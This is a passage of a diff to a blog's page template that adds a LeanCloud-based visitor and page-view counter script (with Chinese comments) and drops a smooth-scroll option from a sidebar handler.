+      // 请求 UV 并自增
+      var uvCtn = document.querySelector('#lc-uv');
+      if (uvCtn || enableIncr) {
+        var uvGetter = this.getRecord(Counter, 'https://blog.jhyeon.dev' + '/#lc-uv', 'Visitors').then((record) => {
+          var vuv = this.validUV();
+          vuv && incrArr.push(this.buildIncrement(record.objectId))
+          var eles = document.querySelectorAll('#lc-uv #number');
+          if (eles.length > 0) {
+            eles.forEach((el,index,array)=>{
+              el.innerText = record.times + (vuv ? 1 : 0);
+              if (uvCtn) {
+                uvCtn.style.display = 'inline';
+              }
+            })
+          }
+        });
+        getterArr.push(uvGetter);
+      }
+
+      // 请求文章的浏览数，如果是当前页面就自增
+      var allPV = document.querySelectorAll('#lc-pv');
+      if (allPV.length > 0 || enableIncr) {
+        for (i = 0; i < allPV.length; i++) {
+          let pv = allPV[i];
+          let title = pv.getAttribute('data-title');
+          var url = 'https://blog.jhyeon.dev' + pv.getAttribute('data-path');
+          if (url) {
+            var viewGetter = this.getRecord(Counter, url, title).then((record) => {
+              // 是当前页面就自增
+              let curPath = window.location.pathname;
+              if (curPath.includes('index.html')) {
+                curPath = curPath.substring(0, curPath.lastIndexOf('index.html'));
+              }
+              if (pv.getAttribute('data-path') == curPath) {
+                incrArr.push(this.buildIncrement(record.objectId));
+              }
+              if (pv) {
+                var ele = pv.querySelector('#lc-pv #number');
+                if (ele) {
+                  if (pv.getAttribute('data-path') == curPath) {
+                    ele.innerText = (record.times || 0) + 1;
+                  } else {
+                    ele.innerText = record.times || 0;
+                  }
+                  pv.style.display = 'inline';
+                }
+              }
+            });
+            getterArr.push(viewGetter);
+          }
+        }
+      }
+
+      // 如果启动计数自增，批量发起自增请求
+      if (enableIncr) {
+        Promise.all(getterArr).then(() => {
+          incrArr.length > 0 && this.increment(Counter, incrArr);
+        })
+      }
+
+    },
+
+
+    fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${ api_server }/1.1${ url }`, {
+          method,
+          headers: {
+            'X-LC-Id': this.app_id,
+            'X-LC-Key': this.app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      this.addCount(Counter);
+    },
+
+    refreshCounter() {
+      var api_server = this.app_id.slice(-9) !== '-MdYXbMMI' ? this.custom_api_server : `https://${ this.app_id.slice(0, 8).toLowerCase() }.api.lncldglobal.com`;
+      if (api_server) {
+        this.fetchData(api_server);
+      } else {
+        fetch('https://app-router.leancloud.cn/2/route?appId=' + this.app_id)
+          .then(resp => resp.json())
+          .then(({api_server}) => {
+            this.fetchData('https://' + api_server);
+          });
+      }
+    }
+
+  };
+
+  LCCounter.refreshCounter();
+
+  document.addEventListener('pjax:complete', function () {
+    LCCounter.refreshCounter();
+  });
+</script>
+
+
 
 
 
@@ -1214,8 +1335,6 @@ function listennSidebarTOC() {
       event.preventDefault();
       window.scrollTo({
 		top: target.offsetTop + 100,
-		
-		behavior: "smooth"
 		
 	  });
     });
